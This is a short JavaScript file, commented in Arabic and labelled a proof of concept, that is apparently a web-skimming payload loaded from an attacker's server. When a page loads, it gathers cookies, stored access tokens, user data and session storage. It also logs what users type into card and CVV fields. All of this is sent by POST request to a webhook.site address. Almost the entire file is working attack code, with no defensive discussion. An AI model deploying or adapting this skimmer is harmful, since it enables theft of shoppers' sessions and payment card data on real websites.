// Path: https://attacker-server.com/script-loader/main.js
(function() {
    const ATTACKER_API = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe/exfiltrate";

    console.warn("🛑 POC: Environment Injection Successful. Executing Payload...");

    // 1. جمع التوكينات والبيانات الحساسة من الذاكرة
    const sensitiveData = {
        victim_url: window.location.href,
        cookies: document.cookie, // سرقة الـ Session ID
        localStorage: {
            auth_token: localStorage.getItem('access_token') || "Not Found",
            user_data: localStorage.getItem('user_info'),
            cart_id: localStorage.getItem('cart_id')
        },
        sessionStorage: JSON.stringify(sessionStorage)
    };

    // 2. تتبع ضغطات المفاتيح (Keylogging) لسرقة بيانات البطاقة عند إدخالها
    document.addEventListener('input', (e) => {
        const target = e.target;
        if (target.name && (target.name.includes('card') || target.id.includes('cvv'))) {
            const keystrokeData = {
                field: target.name || target.id,
                value: target.value,
                timestamp: Date.now()
            };
            sendData(keystrokeData);
        }
    });

    // 3. وظيفة إرسال البيانات المسروقة لخادم المهاجم
    function sendData(payload) {
        fetch(ATTACKER_API, {
            method: 'POST',
            mode: 'no-cors', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // إرسال التوكينات فور التحميل
    sendData(sensitiveData);
})();
